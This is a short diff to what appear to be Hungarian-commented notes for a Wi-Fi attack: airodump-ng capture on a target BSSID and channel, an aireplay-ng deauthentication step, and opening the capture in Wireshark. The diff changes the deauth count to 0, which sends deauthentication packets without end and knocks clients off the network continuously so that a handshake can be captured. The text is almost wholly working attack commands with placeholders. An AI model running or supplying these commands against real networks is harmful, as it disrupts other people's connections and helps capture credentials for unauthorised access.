@@ -11,7 +11,7 @@ sudo airodump-ng wlan0 -d (bssid)
 sudo airodump-ng -w név1 -c 2 --bssid bssid szám wlan0
 
 //3. ablak, deauth
-sudo aireplay-ng --deauth (channel szám) -a (bssid szám) wlan0
+sudo aireplay-ng --deauth 0 -a (bssid szám) wlan0
 
 //4. ablak, wireshark
 wireshark név1-01.cap
